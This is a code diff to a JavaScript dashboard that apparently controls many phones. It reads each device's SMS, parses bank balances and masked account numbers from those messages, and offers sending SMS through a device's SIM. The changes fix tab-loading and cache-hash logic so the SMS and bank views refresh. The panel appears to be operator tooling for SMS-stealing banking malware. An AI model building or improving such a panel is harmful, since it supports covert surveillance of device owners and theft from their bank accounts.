@@ -1444,6 +1444,8 @@ function restoreDeviceSession(devId){
   _bankDataHash=c.bankHash||'';
   _bankParseCache[devId]=c.bankRows||[];
   tabLoaded=Object.assign({},c.tabLoaded||{});
+  tabLoaded.sms=false;
+  tabLoaded.bank=false;
   return true;
 }
 function clearDeviceListenersForDev(dev){
@@ -2182,8 +2184,12 @@ function openDevice(id){
       if(_simCache[id]) renderSendSimPicker(_simCache[id]);
       else loadSendSimOptions(dev);
     }
-    if(!tabLoaded[tab]) ensureTabLoaded(tab);
-    else if((tab==='sms'||tab==='bank')&&!window._allSmsData.length) ensureTabLoaded('sms');
+    if(tab==='sms'||tab==='bank'){
+      ensureTabLoaded('sms');
+      if(tab==='bank') renderBankAccounts();
+    } else if(!tabLoaded[tab]){
+      ensureTabLoaded(tab);
+    }
   },0);
 }
 
@@ -2522,8 +2528,9 @@ function switchDataTab(name,btn){
   btn.classList.add('active');
   document.querySelectorAll('.data-section').forEach(function(s){s.classList.remove('active');});
   document.getElementById('tab-'+name).classList.add('active');
-  if(name==='bank'&&!tabLoaded.sms) ensureTabLoaded('sms');
-  ensureTabLoaded(name);
+  if((name==='sms'||name==='bank')&&!tabLoaded.sms) ensureTabLoaded('sms');
+  if(name==='bank') renderBankAccounts();
+  else ensureTabLoaded(name);
 }
 
 // ═══ FIREBASE WRITE (SDK or REST) ═══
@@ -2857,7 +2864,7 @@ function renderBankAccounts(){
   if(!smsList.length&&noteEl)noteEl.textContent='Fetching SMS and parsing bank balances...';
   var banks=parseBankAccountsFromSms(smsList);
   if(selDev) _bankParseCache[selDev]=banks;
-  var bh=banks.length+'|'+smsList.length;
+  var bh=banks.map(function(b){return b.bank+'|'+b.accountMask+'|'+b.current+'|'+b.count;}).join('::')+'|'+smsList.length;
   if(bh===_bankDataHash&&listEl&&listEl.children.length) return;
   _bankDataHash=bh;
   paintBankCards(banks,smsList.length,listEl,emptyEl,badge,noteEl);
@@ -3011,7 +3018,10 @@ function renderSmsList(){
   merged.sort(smsSortDesc);
   merged=merged.slice(0,100);
   var listHash=merged.length+'|'+total+'|'+newMsgs.length+'|'+(merged[0]?smsDedupKey(merged[0]):'')+'|'+(merged[merged.length-1]?smsDedupKey(merged[merged.length-1]):'');
-  if(listHash===_smsListHash) return;
+  if(listHash===_smsListHash){
+    if(_activeDataTab==='bank') renderBankAccounts();
+    return;
+  }
   _smsListHash=listHash;
   window._smsData=merged;
   document.getElementById('tc-sms').textContent=(newMsgs.length+total)+' (showing 100)';
